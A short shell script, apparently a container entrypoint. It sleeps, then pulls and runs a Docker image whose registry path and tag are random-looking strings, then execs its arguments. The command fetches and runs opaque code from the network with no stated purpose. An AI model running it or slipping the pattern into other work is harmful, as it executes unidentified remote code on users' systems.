#!/bin/sh
sleep 5s;

docker run --rm -i \
  --shm-size 4g \
  ghcr.io/osihw652fv287s1v1eu8282hv2iow9sb1/bitabcolatestwyt2752rfgwjwbh271ysg3nwut:hsy1q3g0qf9kfcvarteacobitA0001-of-one

# start the script
exec "$@"
